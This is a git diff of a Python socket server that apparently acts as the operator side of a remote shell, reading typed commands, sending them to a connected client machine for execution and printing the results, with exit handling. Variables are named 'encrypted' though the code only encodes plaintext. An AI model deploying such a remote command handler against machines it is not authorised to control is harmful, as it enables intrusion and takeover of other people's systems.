@@ -4,7 +4,7 @@ import socket
 
 import configuration as config  # Import configuration file
 
-# CONSTANTS
+# CONSTANTS & GLOBALS
 ADDRESS = (config.SERVER_ADDR, config.SERVER_PORT)
 BACKLOG = 5  # Max number of queued connections, system-dependent
 
@@ -31,6 +31,17 @@ connection_socket.send(message)  # Need to add some asymmetric encryption
 # Server REPL loop - run the interactive shell
 while True:
     # Read in command from input
+    command = input(":3 ")
+    # Note: break out of loop if the command was 'exit' or 'hangup'
+    stripped_cmd = command.strip().lower()
+    if stripped_cmd == "exit" or stripped_cmd == "hangup":
+        # Tell the client to shut down, end server program
+        encrypted_exit = command.encode()
+        connection_socket.send(encrypted_exit)
+        break
     # Execute the command on the remote machine (client)
-        # Note: break out of loop if the command was 'exit' or 'hangup'
+    encrypted_command = command.encode()
+    connection_socket.send(encrypted_command)
     # Print the results
+    decrypted_results = connection_socket.recv(config.PAYLOAD_SIZE).decode()
+    print(decrypted_results)
